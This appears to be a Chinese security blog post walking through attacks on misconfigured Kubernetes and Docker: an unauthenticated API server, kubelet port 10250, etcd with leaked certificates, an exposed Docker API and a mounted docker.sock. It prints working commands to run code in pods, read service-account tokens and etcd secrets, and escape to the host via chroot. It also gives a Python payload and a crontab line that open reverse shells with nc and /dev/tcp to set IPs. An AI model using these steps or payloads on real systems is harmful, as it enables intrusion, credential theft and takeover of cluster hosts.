![49b51fa19abe6d6ebc396a29797c18af.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfLOLv8IPvyHby4xTdIxzV5DbwiayKvhXUWBqWVicfTzqz1JOZZoCXibvoA/640?wx_fmt=png&from=appmsg "")  
  
传统艺能，搜到了这种解决方案，可惜不行：（  
  
安装wscat  
```
npm install -g wscat
```  
  
![c2e6b98389be66aced0da9cfc12e8199.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfVHjm1er0Byu10KEjRVicfWbJM3Gibg8VAQbCjwrPPmicb9X5wn7aStN1Q/640?wx_fmt=png&from=appmsg "")  
  
![5ff5d24a6fd2d230fb29dcf6e4c32213.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKf47ibosbhQtwfevYp4C1J3HkIDcXWhdx2CXUfUib4n6YvQcVC5oDJfzQA/640?wx_fmt=png&from=appmsg "")  
  
不过这里还是没解决这个问题  
  
并且还遇到一个问题  
  
![a995cfe7869dd6129825bea9ca28e7a3.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfdTOgZEplCJSqOynPBwswVmuueYlQ9sUPwGLnuGBljnscNQAq0xJiatA/640?wx_fmt=png&from=appmsg "")  
  
  
一开始我以为是本地的kubectl跟服务端的版本不同导致的，后来发现，并不是这样，哪怕我在k8s的服务器上使用该命令，还是会出现这个  
  
不过我又发现一个新的方法，虽然不知道是为什么，但是这个方法确实可行  
  
![b6d00de3841ac60e34d4bfcd1587e017.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKf5KGzUow2vEmbj0iakbvMRcywVjWPnwGsZQZkCicMulUoAT1bvYSWpuBg/640?wx_fmt=png&from=appmsg "")  
  
  
偶然发现，这里虽然会让你输入账号和密码，但是随便输入之后，还是会显示pods，那么我通过POST创建pods，然后我在用这里连上去，然后chroot去获取宿主机权限呢？  
```
./kubectl --insecure-skip-tls-verify -s https://ip:6443 get pods
```  
  
![4a5b888d873ebb0fbaf62424b28b8c85.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfVWjK8hYg145WUGVsk7goOPWXEwd4biaFT4HtcoTzBndsMHeOGNbDkvA/640?wx_fmt=png&from=appmsg "")  
  
可以看到，我们这里已经创建了恶意的pods  
```
./kubectl --insecure-skip-tls-verify -s https://ip:6443 --namespace=default exec -it test-4444 bash
```  
  
![bd488eb9ad66fa4448206f81d4ff67d7.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfWRn9s5wPr11UFkF9Zp2ld3piaEBswLnfUbEnCe0t7rqdIQFafSfUkpQ/640?wx_fmt=png&from=appmsg "")  
  
可以看到已经通过挂在宿主机根目录到host目录，通过chroot来到的宿主机，那么也可以看到我们root目录下的metarget，创建一个文件看看  
  
![285daca23e32d654928642842d7a165c.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKflJRuPXCVIJHlMVsE5giaKibQtTBxAnakLdQLo81YTiaTxLUDYeQiasaXFA/640?wx_fmt=png&from=appmsg "")  
  
  
成功了，不过如果有k8s大佬知道这是为什么，可以告诉我，谢谢大佬，我的Github有我的微信二维码  
# 五、k8s kubelet 10250端口未授权  
  
**正常访问该端口会提示未授权**  
  
![7e3da78c0cdb194f643ebde50067bd6a.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKflJRuPXCVIJHlMVsE5giaKibQtTBxAnakLdQLo81YTiaTxLUDYeQiasaXFA/640?wx_fmt=png&from=appmsg "")  
  
  
并且如果直接访问这个端口会提示404  
  
![9af14e215644017dd94509526e6d75d5.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfnxqkic88ibPfX35HNleKwjS7uFRLykQGP6E4o88fMF5vXDTszDPAoQIQ/640?wx_fmt=png&from=appmsg "")  
  
  
但是如果将/var/lib/kubelet/config.yml配置错误的修改为如下  
  
![cab861b11f26fc25656eb0d93d8297ab.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfaEs71UPArwV5YSpJOBIKBWze0jCRB1gNZH29xuhw4DqbNkiaic7ibRxvg/640?wx_fmt=png&from=appmsg "")  
  
  
随后将authorization.mode修改为AlwaysAllow  
  
![7ea550ca7c96733a5e354ccdd5525a5f.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKf8aRoF22iaialgAWLFfvboornGGP25NRc6ia03aFibzZ9wrAicoql6swymJw/640?wx_fmt=png&from=appmsg "")  
  
  
随后重启  
```
systemctl restart kubelet
```  
  
![fe67a4c31ec759ad455cba9db343c341.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfJb38ticTXLTvzLVltNuTvdBtJ82xzldKH9hibV4r9vMWUBXWPJ86DicFg/640?wx_fmt=png&from=appmsg "")  
  
再访问这个端口就会发现不需要认证，那么如何执行命令呢？  
## 1、执行命令  
```
curl -XPOST -k "https://${IP_ADDRESS}:10250/run/<namespace>/<pod>/<container>" -d "cmd=<command-to-run>"
```  
  
这里需要三个参数  
  
1、namespace  
  
2、pod  
  
3、container  
  
在这里获取  
```
https://8.210.134.222:10250/runningpods/
```  
  
![fa245847f0b9fcef1d6e995e8319df4f.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKf8m7yRR9SWNue2qDAm2oH1e69l2OgFKnlPibXmibxwUtYMmVGG915pnwg/640?wx_fmt=png&from=appmsg "")  
  
![f83395499bf23e7c7f0799a7647c7beb.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfnvZic7NGUkLUEKWoKSzyHmbSk4uvN9tMBswpLbzgRtW4t9ffWCr6E7g/640?wx_fmt=png&from=appmsg "")  
## 2、获取凭证  
```
curl -XPOST -k https://ip:10250/run/default/attacker/ubuntu -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```  
  
一个 pod 与一个服务账户相关联，该服务账户的凭证（token）被放入该pod中每个容器的文件系统树，在 /var/run/secrets/kubernetes.io/serviceaccount/token  
  
如果服务账号（Service account ）绑定了 cluster-admin （即集群的 admin 权限我们可以对所有namespace下实例进行操作） ，那么我们就可以通过 token 来进行一系列的操作  
  
![image-20220508144853270](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKficS6uJtSYh1QFbJj1Tfn9C1zsLrmPibNpLzibwf7ibkb6xsp2ToB19T5zA/640?wx_fmt=png&from=appmsg "")  
  
  
尝试了一下，这个token是可以登录dashboard的，那么如果绑定的权限够的话，完全可以通过这个token去登录dashboard  
  
![aff0b4e6d7ab33eb334043b5e01fb49e.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfERF8OtnONHbvwo6W42HKozmn1XTiaVZ1hibMldkiasCpPgjyuD0mdIicHA/640?wx_fmt=png&from=appmsg "")  
  
## 3、一些问题  
### 3.1、authorization.mode.AlwaysAllow  
  
![6aaf5d4774c23c2eb4627ae11f046711.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfQ37xFpB3TqdSAaFfLWg1DxuJjDP25SHawqKD4ricYZiczShPhznQo0rw/640?wx_fmt=png&from=appmsg "")  
  
将这里的mode设置为AlwaysAllow之后，那么使用API就不需要鉴权了，默认是使用WebHook，在配置为WebHook请求的时候会返回如下  
  
![19affe828473c9320830a01ea07cdf58.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKf7Dv844wXIOGk4QtwR5Na7mtNBw4MCSwss1qKsOKQ564H23Ipxogqiag/640?wx_fmt=png&from=appmsg "")  
  
# 六、etcd未授权  
  
![e8d7828d3c256e35780381efc196453e.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKf67SocXiaGXoaW3Vln7EuTDHG6icol7Bh4JLTDAu1htgWvzgZonOhanFw/640?wx_fmt=png&from=appmsg "")  
## 为什么会出现etcd未授权  
  
在启动etcd时，如果没有指定 --client-cert-auth 参数打开证书校验，并且把listen-client-urls监听修改为0.0.0.0那么也就意味着这个端口被暴露在外，如果没有通过安全组防火墙的限制，就会造成危害  
  
etcd默认端口2379  
  
ps: 不过在安装k8s之后默认的配置2379都只会监听127.0.0.1，而不会监听0.0.0.0，那么也就意味着最多就是本地访问，不能公网访问  
  
![838a23cfcdb100dd7a703380de725b14.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKflpzUR5roywMDu3OBPf7MPn8sgKjcNf2iaibCJqlk5yUjxhLvjLLn7D8w/640?wx_fmt=png&from=appmsg "")  
  
  
那么我们看一下手动搭建的集群  
  
![6c57cd856786d2465eb8c48c144ab988.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKft0nRaibvic4ze2A6CKdr3OFgibKeTRU87en6F4YpibtvR7DDzym6O7wQTA/640?wx_fmt=png&from=appmsg "")  
  
  
可以发现，除了监听本地的私有地址之外，也就只有127.0.0.1了  
## 错误的配置--client-cert-auth  
  
![2564ba4363e8c392b148c134128b653e.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKffI44aicvntrh4QibgxwDDmMibw7XdKfFW7FcQwicg7VBb2lbAR5xMoSjxg/640?wx_fmt=png&from=appmsg "")  
  
etcd的配置文件在/etc/kubernetes/manifests/etcd.yaml  
  
![f2326e64dd1e023f0692abf20aeca005.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKf1bXuZkOEYRkLwalWEnAcL2gtfIObpn9Q0Og7ThO8kDVicoj7bZ6BsyA/640?wx_fmt=png&from=appmsg "")  
  
  
如果此时将--client-cert-auth写入到这个配置文件里面  
  
在打开证书校验选项后，通过本地127.0.0.1:2379地址可以免认证访问Etcd服务，但通过其他地址访问要携带cert进行认证访问  
  
在未使用client-cert-auth参数打开证书校验时，任意地址访问Etcd服务都不需要进行证书校验，此时Etcd服务存在未授权访问风险。  
## 证书泄露  
  
默认情况下用etcdctl 访问2379会需要证书  
  
![a9e8d933cc0d150d2e6bc31006147f8a.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfqj6eZyUotY6V1IzpYIcAfPyTzVnJy78WnPPiaKMKgSMJsWEv3abJkYg/640?wx_fmt=png&from=appmsg "")  
  
  
但是如果证书泄露了，就可以通过证书来获取etcd  
```
export ETCDCTL_CERT=/etc/kubernetes/pki/etcd/peer.crtexport ETCDCTL_CACERT=/etc/kubernetes/pki/etcd/ca.crtexport ETCDCTL_KEY=/etc/kubernetes/pki/etcd/peer.key
```  
  
![23fa635cccc1bb7bab065ee7f6b1f04d.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKf1gicB71eic87TosD2bD60oHoc0NLGho6CNXSSicmlbhAwLoWNXpYs71Wg/640?wx_fmt=png&from=appmsg "")  
  
获取token  
```
/etcdctl --endpoints=https://127.0.0.1:2379/ get --keys-only --prefix=true "/" | grep /secrets/kube-system/clusterrole
```  
  
![ca80720b59215838ed0f94b0c58e8068.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfgZmYVuBqwNCicwNSfpNvPRT6ribHmOfAVCuicR7T4fCDYuZ4hdia1PGhVA/640?wx_fmt=png&from=appmsg "")  
  
![98010b9a55f49b263401fe4e62d9d8bc.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKf4w7N1TsBq0PnFcHR9HoffudIWmGyYmAsicZAUeJibBkXJ0eqGVR1bs8g/640?wx_fmt=png&from=appmsg "")  
```
./etcdctl --endpoints=https://127.0.0.1:2379/ get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-fltzp
```  
  
通过该token可以获取k8s集群的权限  
```
kubectl --insecure-skip-tls-verify -s https://127.0.0.1:6443 --token="" -n kube-system get pods
```  
  
![996098ae7a6ef402d429487bc3b1c3c6.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfJyULT0MUfz78YhnkzhcLfPQz6ry2EhkDVMs6oHJg163wL89zETbpcg/640?wx_fmt=png&from=appmsg "")  
  
不过这里需要注意，在kubectl 1.2的版本没有insecure-skip-tls-verify这个参数  
  
![image-20220508145028721](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfKUCE6DgUI5HbaDb9QLUZmKxOWnEpibnq1ibAArlJ5QCujM4nhrsBIl0Q/640?wx_fmt=png&from=appmsg "")  
  
  
通过kubectl opthion也没有看到这个参数，但是我们在1.16.6版本中可以看到有这个参数  
  
![63a62985b839e8dce6291f5f2074c7fc.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKf0GB4Io2F5uuH3zJmSYohKbRh3GwbNuSZYTZSLW5W39Dl9X2ibVeaWFg/640?wx_fmt=png&from=appmsg "")  
  
  
![4c96c60eed61f7848b19f973f0c4c0cd.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKf1G905PCRZcv9altBGnZEKuFoTgU1p68tesEwtQic86U6tf8IQCLibEOw/640?wx_fmt=png&from=appmsg "")  
### 如何安装指定版本的kubectl  
```
curl -LO "https://dl.k8s.io/release/{这里写你要下载的版本}/bin/darwin/amd64/kubectl"# 例子curl -LO "https://dl.k8s.io/release/v1.16.6/bin/darwin/amd64/kubectl"
```  
# 七、k8s+Docker会存在的问题  
  
以下举例了两个docker会造成的问题，因为k8s+docker是比较常见的组合，所以docker上存在的问题，自然也会带到k8s中，更多docker逃逸到我的博客  
- https://uzzju.com/?id=40  
  
## 1、Docker API未授权  
  
因为现在常见的搭配还是K8s+docker的组合，那么docker上存在的问题，在这个组合中也必然会存在  
  
漏洞原理：在使用docker swarm的时候，节点上会开放一个TCP端口2375，绑定在0.0.0.0上，如果我们使用HTTP的方式访问会返回404  利用思路：通过挂在宿主机的目录，写定时任务获取SHELL，从而逃逸  
  
![159875274e01300198a8b19aea8d4f1b.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfdzQYKoH8LrUE0nfWKGHNia7aibeTNZOXSoEQDKIsBFKKRg37Yv6RhDcg/640?wx_fmt=png&from=appmsg "")  
  
  
![682f06268ee7970e1c3e87a0334f0eb6.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfgTScYy2EciabbfGHaDsH2AIToUTnZricibKiaeuekGJceLKibN8KX6ZOq3Q/640?wx_fmt=png&from=appmsg "")  
```
docker ps -a | grep rce
```  
  
![c3aebdef75df8c4c0660726027429596.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfLdmpahKto5gibRxlFkhJyJHuPajQfKNgVA6ruPKb2Xia4lzPbRLbribRQ/640?wx_fmt=png&from=appmsg "")  
  
访问ip:2375/version   
  
![48852cf4de76a97f252ef9ee628d2179.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKf1pgEhFSu5mUwfefgnHYiclCia5SrqichLYXS8Brfaft1JXXU0C15G4Ykw/640?wx_fmt=png&from=appmsg "")  
  
**payload**  
```
import docker  client = docker.DockerClient(base_url='http://192.168.0.138:2375') data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc 192.168.0.138 1234 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}}) print(data)
```  
  
![1e518b5fd5dfa75b5fb86766abe744d0.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfPIfbM6ClnluibiavNP4ASaAYGZvSVNr5Pps2APx7jqvH1mokicywdp35Q/640?wx_fmt=png&from=appmsg "")  
## 2、挂载docker.sock  
### 2.1、什么是docker.sock  
  
![61a823d41d2d3bf0911729d22d78fc84.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfqRUBpfJcibaxt0GDl7KIcnE5fy6nbZoXTibeqxy9icDEjsibU795yicrAlg/640?wx_fmt=png&from=appmsg "")  
  
/var/run/docker.sock是 Docker守护程序默认监听的 Unix 套接字。它也是一个用于从容器内与Docker守护进程通信的工具  **取自StackOverflow**  
Unix Sockets  术语套接字通常是指 IP 套接字。这些是绑定到端口（和地址）的端口，我们向其发送 TCP 请求并从中获取响应。  
  
另一种类型的 Socket 是 Unix Socket，这些套接字用于IPC（进程间通信）。它们也称为 Unix 域套接字 ( UDS )。Unix 套接字使用本地文件系统进行通信，而 IP 套接字使用网络。  
  
Docker 守护进程可以通过三种不同类型的 Socket 监听 Docker Engine API 请求：unix, tcp, and fd.  默认情况下，在 /var/run/docker.sock 中创建一个 unix 域套接字（或 IPC 套接字）  
### 2.2、创建docker  
```
docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:18.04 
```  
  
![401eb30118e548e2332c56fe1b3f8e1a.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfPSSJia7LXmKBqtcA1fkrv8M4SydVDXzmz4XKYPCJXsbXySkUlkgTu0g/640?wx_fmt=png&from=appmsg "")  
  
随后在docker容器中安装docker  
```
# ubuntu 18.04安装dockersudo apt-get update# 安装依赖包sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common# 添加 Docker 的官方 GPG 密钥curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -# 验证您现在是否拥有带有指纹的密钥sudo apt-key fingerprint 0EBFCD88# 设置稳定版仓库sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"# 更新$ sudo apt-get update# 安装最新的Docker-ce sudo apt-get install docker-ce# 启动sudo systemctl enable dockersudo systemctl start docker
```  
  
![a958e3dd569caa77f796d78fd63df88e.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfsd509Bso3Y0957mZY05ORItnFe7n9STopejkjsHjqps0uwiaicq3qU1w/640?wx_fmt=png&from=appmsg "")  
  
安装完成之后我们使用docker ps就可以看到宿主机上的容器了  
### 2.3、复现  
  
将宿主机的根目录挂载到容器  
```
docker run -it -v /:/uzju ubuntu:18.04 /bin/bash 
```  
```
chroot uzju 
```  
  
![2f36ba1121b7e877ee41e10aa4239602.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKfFj30epg20IdAvYcUAZ3iaWurn6TGichyVibEp0Xc6xWZDKSMvw6VjuJJg/640?wx_fmt=png&from=appmsg "")  
  
可以看到宿主机root目录上的图片，反弹shell也是修改crontab即可  
### 2.4、反弹shell  
  
通过修改Crontab定时任务来反弹shell  
```
crontab -e  
```  
```
* * * * * /bin/bash -i >& /dev/tcp/192.168.0.139/123 0>&1 
```  
  
![068556ab6d5160c90d925bee95ab2e9e.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKf3cHwuib2HIK0x3yiazgxEag1Vw05SUEZS2pibvqqRrfDJdL2YVWaLufKw/640?wx_fmt=png&from=appmsg "")  
  
![4b34102dc69232f5b171d40c3c339b84.png](https://mmbiz.qpic.cn/mmbiz_png/awCdqJkJFEQoicDkiby7afp5lmH7hyUsKf26DicH1YgStR12XgZYxSvod05BBdZH5ibh4lTkpdPiarCQ4klD0wFaoxA/640?wx_fmt=png&from=appmsg "")  
  
  
最后推荐一下小密圈，干货满满，物超所值，**内部圈子每增加100人，价格将上涨20元，越早进越优惠嗷~~**  
  
****  
